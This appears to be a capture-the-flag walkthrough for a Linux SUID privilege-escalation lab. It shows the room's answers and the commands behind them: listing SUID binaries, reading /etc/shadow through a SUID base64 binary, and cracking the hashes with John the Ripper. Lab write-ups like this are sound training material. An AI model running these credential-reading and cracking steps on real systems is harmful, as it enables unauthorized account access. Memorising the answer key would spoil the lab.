## Privilege Escalation SUID Solution

### Which user shares the name of a great comic book writer?
1. Execute `cat /etc/passwd/`
   
**Answer: gerryconway**

### What is the password of user2?

1. Type `find / -type f -perm -04000 -ls 2>/dev/null` to list files that have SUID or SGID bits set. 
2. Go to [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid) to get list of appliations exploitable when SUID bit is set.
3. Can see that base64 is exploitable and we can escalate privileges using SUID.
4. Using the guide that gtfobins gave us we execute the following: 
   ```
   LFILE=/etc/shadow
   base64 "$LFILE" | base64 --decode
   ```

5. Create a local file `passwd.txt` and `shadow.txt` and copy the content from the target machine.

6. Unshadow the files:
   
   ```unshadow passwd.txt shadow.txt > passwords.txt```
   
8. Run john the ripper on `passwords.txt`
```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

**Answer: Password1**

### What is the content of the flag3.txt file?

1. Let's first check the home directory for the `flag3.txt` file.
2. Let's run the command agin provided by GTFO. 

```
   LFILE=/home/ubuntu/flag3.txt
   base64 "$LFILE" | base64 --decode
```

**Answer: THM-3847834**


   
